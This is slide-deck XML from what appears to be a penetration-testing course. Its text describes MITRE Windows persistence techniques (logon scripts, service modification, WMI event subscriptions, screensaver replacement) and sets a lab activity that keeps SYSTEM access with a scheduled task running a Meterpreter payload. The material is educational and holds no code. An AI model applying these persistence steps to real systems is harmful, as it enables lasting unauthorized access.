                <a:solidFill>
                  <a:srgbClr val="1475D4"/>
                </a:solidFill>
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>hour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>(0-23)</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1095" name="Google Shape;1095;p124"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4474400" y="4485174"/>
            <a:ext cx="3801000" cy="215400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:srgbClr val="1475D4"/>
                </a:solidFill>
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>minute </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>(0-59) </a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>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99" name="Shape 1099"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1100" name="Google Shape;1100;p125"/>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Clr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Windows Persistence</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1101" name="Google Shape;1101;p125"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="1205375"/>
            <a:ext cx="4061100" cy="1881600"/>
          </a:xfrm>
          <a:prstGeom prst="round2DiagRect">
            <a:avLst>
              <a:gd fmla="val 0" name="adj1"/>
              <a:gd fmla="val 13470" name="adj2"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accen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u="sng">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
                <a:hlinkClick r:id="rId3">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>Boot or Logon Initialization Scripts: Logon Script (Windows)</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>In this technique, a pen tester can register </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>a script as a registry key that will execute </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>on startup or login.</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1102" name="Google Shape;1102;p125"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="3269925"/>
            <a:ext cx="4061100" cy="1551600"/>
          </a:xfrm>
          <a:prstGeom prst="round2DiagRect">
            <a:avLst>
              <a:gd fmla="val 0" name="adj1"/>
              <a:gd fmla="val 13470" name="adj2"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent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u="sng">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
                <a:hlinkClick r:id="rId4">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>Create or Modify System Process: Windows Service</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>In this technique, a pen tester can modify </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>a service to run an executable on startup.</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1103" name="Google Shape;1103;p125"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4678049" y="1205375"/>
            <a:ext cx="4061100" cy="1881600"/>
          </a:xfrm>
          <a:prstGeom prst="round2DiagRect">
            <a:avLst>
              <a:gd fmla="val 0" name="adj1"/>
              <a:gd fmla="val 13470" name="adj2"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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u="sng">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
                <a:hlinkClick r:id="rId5">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>Event Triggered Execution: </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1600" u="sng">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
                <a:hlinkClick r:id="rId6">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1600" u="sng">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
                <a:hlinkClick r:id="rId7">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>Windows Management Instrumentation Event Subscription</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>This technique leverages Windows Management Instrumentation, a way of managing Windows machines, to perform an action once a specific event in Windows is triggered. </a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1104" name="Google Shape;1104;p125"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4678049" y="3269925"/>
            <a:ext cx="4061100" cy="1551600"/>
          </a:xfrm>
          <a:prstGeom prst="round2DiagRect">
            <a:avLst>
              <a:gd fmla="val 0" name="adj1"/>
              <a:gd fmla="val 13470" name="adj2"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accen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u="sng">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
                <a:hlinkClick r:id="rId8">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>Event Triggered Execution: </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1600" u="sng">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
                <a:hlinkClick r:id="rId9">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1600" u="sng">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto Medium"/>
                <a:ea typeface="Roboto Medium"/>
                <a:cs typeface="Roboto Medium"/>
                <a:sym typeface="Roboto Medium"/>
                <a:hlinkClick r:id="rId10">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>Screensaver</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="500"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>This technique allows the pen tester to replace the executable that is used to display the screensaver with a malicious executable or payload.</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto Medium"/>
              <a:ea typeface="Roboto Medium"/>
              <a:cs typeface="Roboto Medium"/>
              <a:sym typeface="Roboto Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1105" name="Google Shape;1105;p125"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId11">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="34005" l="22612" r="22463" t="36565"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5600250" y="361675"/>
            <a:ext cx="3138900" cy="442800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 16667" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1106" name="Google Shape;1106;p125"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="70200" y="515275"/>
            <a:ext cx="5416200" cy="3231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Some examples of MITRE persistence techniques in Windows:</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>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sp>
        <p:nvSpPr>
          <p:cNvPr id="1111" name="Google Shape;1111;p126"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="37724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Windows persistence</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5" name="Shape 1115"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>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sp>
        <p:nvSpPr>
          <p:cNvPr id="1120" name="Google Shape;1120;p128"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="4398800"/>
            <a:ext cx="8703600" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>15 minutes</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1121" name="Google Shape;1121;p128"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1719600"/>
            <a:ext cx="7055700" cy="21162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900"/>
              <a:t>In this activity, you will establish persistence on the Windows machine to ensure your SYSTEM access. To do so, use Task Scheduler and create a scheduled task that will execute </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en" sz="1900"/>
            </a:br>
            <a:r>
              <a:rPr lang="en" sz="1900"/>
              <a:t>a custom Meterpreter payload.</a:t>
            </a:r>
            <a:endParaRPr sz="1900"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1900"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1122" name="Google Shape;1122;p128"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-6000" y="478650"/>
            <a:ext cx="9168600" cy="3231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sz="1800"/>
              <a:t>Windows persistence</a:t>
            </a:r>
            <a:endParaRPr sz="1800"/>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4" name="Shape 1134"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="1135" name="Google Shape;1135;p131"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-9375" y="929900"/>
            <a:ext cx="7346700" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="2E5E73"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="oval"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1136" name="Google Shape;1136;p131"/>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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1137" name="Google Shape;1137;p131"/>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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1138" name="Google Shape;1138;p131"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953325" y="30635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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1139" name="Google Shape;1139;p131"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953325" y="11368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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1140" name="Google Shape;1140;p131"/>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1141" name="Google Shape;1141;p131"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="802850" y="1749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1142" name="Google Shape;1142;p131"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="802850" y="23916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1143" name="Google Shape;1143;p131"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="802850" y="30268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1144" name="Google Shape;1144;p131"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1261850" y="1111075"/>
            <a:ext cx="7073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Exploitation</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1145" name="Google Shape;1145;p131"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1261850" y="1764275"/>
            <a:ext cx="7073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Meterpreter</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1146" name="Google Shape;1146;p131"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1261850" y="2417463"/>
            <a:ext cx="7073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Privilege escalation</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1147" name="Google Shape;1147;p131"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1261850" y="3056275"/>
            <a:ext cx="7073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Process migration</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1148" name="Google Shape;1148;p131"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="136025" y="2336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131"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953325" y="370531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Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1150" name="Google Shape;1150;p131"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="802850" y="366204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5</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="082D49"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1151" name="Google Shape;1151;p131"/>
